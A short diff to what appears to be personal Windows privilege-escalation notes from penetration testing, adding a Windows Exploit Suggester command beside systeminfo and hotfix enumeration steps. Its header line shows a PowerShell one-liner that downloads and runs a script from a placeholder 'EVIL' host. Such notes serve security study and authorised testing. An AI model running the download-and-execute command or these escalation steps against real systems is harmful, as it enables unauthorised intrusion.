@@ -163,6 +163,9 @@ echo IEX (New-Object Net.Webclient).downloadstring('http://EVIL/evil.ps1') | pow
 - systeminfo
 	* Gives us system info 
 	* [Offline - Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
+	```
+	python ~/Desktop/Scripts/WindowsPrivEsc/windows-exploit-suggester.py --database ~/Desktop/Scripts/WindowsPrivEsc/2019-08-19-mssb.xls --systeminfo priv-esc/systeminfo.txt
+	```
 	* Check Hot Fixes
 		* No hot fixes - means no hotfixes installed OR we don't have permissions to view hot fixes
 	* Check OS Name
